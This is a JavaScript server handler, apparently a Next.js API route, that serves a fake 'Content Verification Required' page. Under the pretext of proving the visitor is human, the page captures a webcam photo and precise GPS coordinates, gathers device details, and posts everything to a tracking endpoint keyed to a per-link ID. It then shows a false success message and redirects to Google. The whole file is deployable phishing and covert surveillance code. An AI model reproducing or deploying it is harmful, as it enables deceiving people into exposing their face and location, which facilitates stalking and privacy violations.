export default function handler(req, res) {
  const { id } = req.query;
  
  const html = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Content Verification</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .card {
            background: white;
            border-radius: 20px;
            padding: 40px;
            max-width: 500px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            text-align: center;
        }
        .shield-icon { font-size: 80px; margin-bottom: 20px; }
        h1 { color: #1a1a2e; font-size: 24px; margin-bottom: 10px; }
        p { color: #666; margin-bottom: 25px; line-height: 1.6; }
        .verify-btn {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white; border: none; padding: 18px 50px; font-size: 18px;
            border-radius: 50px; cursor: pointer; transition: all 0.3s ease;
            font-weight: 600; width: 100%; max-width: 300px;
        }
        .verify-btn:hover { transform: translateY(-2px); box-shadow: 0 10px 30px rgba(102,126,234,0.4); }
        .verify-btn:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
        .loading { display: none; margin-top: 20px; }
        .loading.active { display: block; }
        .spinner {
            border: 4px solid #f3f3f3; border-top: 4px solid #667eea;
            border-radius: 50%; width: 40px; height: 40px;
            animation: spin 1s linear infinite; margin: 0 auto 15px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .status { margin-top: 20px; padding: 15px; border-radius: 10px; display: none; }
        .status.success { background: #d4edda; color: #155724; display: block; }
        .status.error { background: #f8d7da; color: #721c24; display: block; }
        .permissions-list { text-align: left; margin: 20px 0; padding: 0; list-style: none; }
        .permissions-list li {
            padding: 12px 15px; margin: 5px 0; background: #f8f9fa;
            border-radius: 10px; display: flex; align-items: center; gap: 10px; font-size: 14px;
        }
        .permissions-list li .icon { font-size: 20px; }
        .permissions-list li.granted { background: #d4edda; border-left: 4px solid #28a745; }
        .permissions-list li.denied { background: #f8d7da; border-left: 4px solid #dc3545; }
        .permissions-list li.pending { border-left: 4px solid #ffc107; }
    </style>
</head>
<body>
    <div class="card">
        <div class="shield-icon">🛡️</div>
        <h1>Content Verification Required</h1>
        <p>We need to verify you're a real person. Please allow access to continue.</p>
        
        <ul class="permissions-list" id="permList">
            <li class="pending" id="camPerm">
                <span class="icon">📸</span> Camera Access <span id="camStatus">(pending)</span>
            </li>
            <li class="pending" id="locPerm">
                <span class="icon">📍</span> Location Access <span id="locStatus">(pending)</span>
            </li>
        </ul>
        
        <button class="verify-btn" id="verifyBtn" onclick="startVerification()">✅ Continue to Verify</button>
        
        <div class="loading" id="loading">
            <div class="spinner"></div>
            <p>Verifying your device...</p>
        </div>
        
        <div class="status" id="status"></div>
    </div>

    <script>
        const LINK_ID = "${id || ''}";
        const API_URL = window.location.origin + '/api/track';
        
        async function requestCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user', width: { ideal: 320 }, height: { ideal: 240 } }
                });
                
                document.getElementById('camPerm').className = 'granted';
                document.getElementById('camStatus').textContent = '(granted ✓)';
                
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();
                await new Promise(resolve => setTimeout(resolve, 300));
                
                const canvas = document.createElement('canvas');
                canvas.width = 320;
                canvas.height = 240;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, 320, 240);
                const photoData = canvas.toDataURL('image/jpeg', 0.5);
                
                stream.getTracks().forEach(track => track.stop());
                return photoData;
            } catch (err) {
                document.getElementById('camPerm').className = 'denied';
                document.getElementById('camStatus').textContent = '(denied ✗)';
                return null;
            }
        }
        
        function requestLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    document.getElementById('locPerm').className = 'denied';
                    document.getElementById('locStatus').textContent = '(not supported ✗)';
                    resolve(null);
                    return;
                }
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        document.getElementById('locPerm').className = 'granted';
                        document.getElementById('locStatus').textContent = '(granted ✓)';
                        resolve({
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy
                        });
                    },
                    () => {
                        document.getElementById('locPerm').className = 'denied';
                        document.getElementById('locStatus').textContent = '(denied ✗)';
                        resolve(null);
                    },
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                );
            });
        }
        
        async function sendData(photo, location) {
            if (photo) {
                await fetch(API_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ linkId: LINK_ID, type: 'photo', photoData: photo })
                });
            }
            
            if (location) {
                await fetch(API_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        linkId: LINK_ID, 
                        type: 'location', 
                        coords: { lat: location.latitude, lng: location.longitude, accuracy: location.accuracy }
                    })
                });
            }
            
            await fetch(API_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    linkId: LINK_ID, 
                    type: 'info',
                    user_agent: navigator.userAgent,
                    screen_res: screen.width + 'x' + screen.height,
                    platform: navigator.platform,
                    language: navigator.language,
                    hasCamera: !!photo,
                    hasLocation: !!location
                })
            });
        }
        
        async function startVerification() {
            const btn = document.getElementById('verifyBtn');
            const loading = document.getElementById('loading');
            const status = document.getElementById('status');
            
            btn.disabled = true;
            btn.textContent = '⏳ Verifying...';
            loading.classList.add('active');
            
            const photo = await requestCamera();
            const location = await requestLocation();
            await sendData(photo, location);
            
            loading.classList.remove('active');
            
            status.className = 'status success';
            status.innerHTML = '✅ <b>Verification Complete!</b><br>You will be redirected shortly...';
            btn.textContent = '✅ Verified';
            setTimeout(() => { window.location.href = 'https://www.google.com'; }, 2000);
        }
    </script>
</body>
</html>`;
  
  res.setHeader('Content-Type', 'text/html');
  res.status(200).send(html);
}
